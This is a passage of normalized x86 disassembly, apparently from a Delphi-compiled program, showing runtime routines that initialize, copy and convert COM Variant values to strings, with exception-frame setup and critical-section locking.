mov edx [ esi + 0x8 ]
call sub_4040c8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_4105b0
test al al
je r-xdata
mov ecx sub_40ee38
mov edx esi
mov eax ebx
call sub_40ec6c
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e898
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40eeec
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40ee40
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40eb48
sub_40ef30
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404754
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e8a4
pop ebx
pop ebp
retn 0x8
sub_40ef68
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404754
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e8a4
pop ebx
pop ebp
retn 0x8
sub_40efa0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f056
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404754
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e8a4
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f05d
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404098
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4042fc
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407d38
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4048a0
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4042fc
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407cfc
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4048a0
jmp r-xdata
jmp r-xdata
call sub_40e500
sub_40f064
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f123
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f101
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e8a4
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404864
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404950
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4042fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f108
lea eax [ ebp - 0x10 ]
call sub_40ebc4
retn
sub_40f130
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f186
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eeec
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f218
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f18d
lea eax [ ebp - 0x10 ]
call sub_40ebc4
retn
sub_40f194
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4105b0
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f209
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4040c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ebc4
retn
sub_40f218
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f74f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f251 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4040c8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404074
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_40804c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4040c8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_40804c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4040c8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4094e8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4040c8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4094e8
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4040c8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ef30
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4042fc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ef68
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4042fc
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404864
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404950
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4042fc
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40efa0
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4042fc
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_40804c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4040c8
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_40804c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4040c8
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_40804c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4040c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408138
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4040c8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408138
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4040c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f218
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f064
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4040c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f756
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_404098
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_40476c
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_404098
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_40476c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404098
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40f130
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4040c8
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4040c8
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e464
test ah 0x40
je r-xdata
mov eax esi
call sub_404074
mov edx eax
mov eax ebx
call sub_40f194
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40f064
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_4040c8
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f064
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4040c8
jmp r-xdata
jmp [ eax * 4 + jump_table_40f4e5 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40804c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4040c8
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_40804c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4040c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4094e8
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4040c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4094e8
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4040c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ef30
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4042fc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40ef68
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4042fc
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40429c
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40efa0
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4042fc
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40804c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4040c8
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40804c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4040c8
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40804c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4040c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408138
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4040c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408138
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4040c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f218
jmp r-xdata
sub_40f75c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f806
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f7e9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e8a4
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404864
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f7f0
lea eax [ ebp - 0x10 ]
call sub_40ebc4
retn
sub_40f814
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f86a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eeec
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f871
lea eax [ ebp - 0x10 ]
call sub_40ebc4
retn
sub_40f878
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40f930
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4105b0
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f937
lea eax [ ebp - 0x20 ]
call sub_404754
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f913
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404864
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ebc4
retn
sub_40f940
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40fe92
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f97a ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4048a0
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404754
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_40804c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4048a0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_40804c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4048a0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4094e8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4048a0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4094e8
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4048a0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ef30
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404790
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ef68
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404790
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404864
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404950
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40efa0
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404790
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_40804c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4048a0
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_40804c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4048a0
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_40804c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4048a0
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408138
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4048a0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408138
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4048a0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f940
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f75c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404790
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fe99
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_40476c
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_404098
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_40476c
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_404098
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_40476c
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_404098
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_40476c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404098
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f814
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404790
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4048a0
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e464
test ah 0x40
je r-xdata
mov eax esi
call sub_404754
mov edx eax
mov eax ebx
call sub_40f878
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f75c
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404790
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f75c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404790
jmp r-xdata
jmp [ eax * 4 + jump_table_40fc01 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40804c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4048a0
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_40804c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4048a0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4094e8
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4048a0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4094e8
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4048a0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40ef30
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404790
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ef68
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404790
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404864
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40efa0
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404790
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40804c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4048a0
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40804c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4048a0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40804c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4048a0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408138
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4048a0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408138
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4048a0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f940
jmp r-xdata
sub_40fea0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40eb48
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_40fedc
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40eb48
sub_40ff08
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40eb48
sub_40ff6c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4040c8
pop esi
pop ebx
retn
mov eax ebx
call sub_40eb48
sub_40ff98
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404950
pop esi
pop ebx
retn
mov eax ebx
call sub_40eb48
sub_410154
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41027a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_4040c8
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_4040c8
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4105b0
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4040c8
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404380
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408160
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404380
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031f0
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402864
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4042d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410281
lea eax [ ebp - 0x208 ]
call sub_404074
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404380
sub_41030c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41036d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404e6c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410374
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_4032a0
sub_410384
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_4105b0
test al al
je r-xdata
mov eax ebx
call sub_410530
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4103bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_410530
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_4105b0
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_410410
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_410448
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_410530
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_410484
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40362c
mov [ ebp - 0x5 ] dl
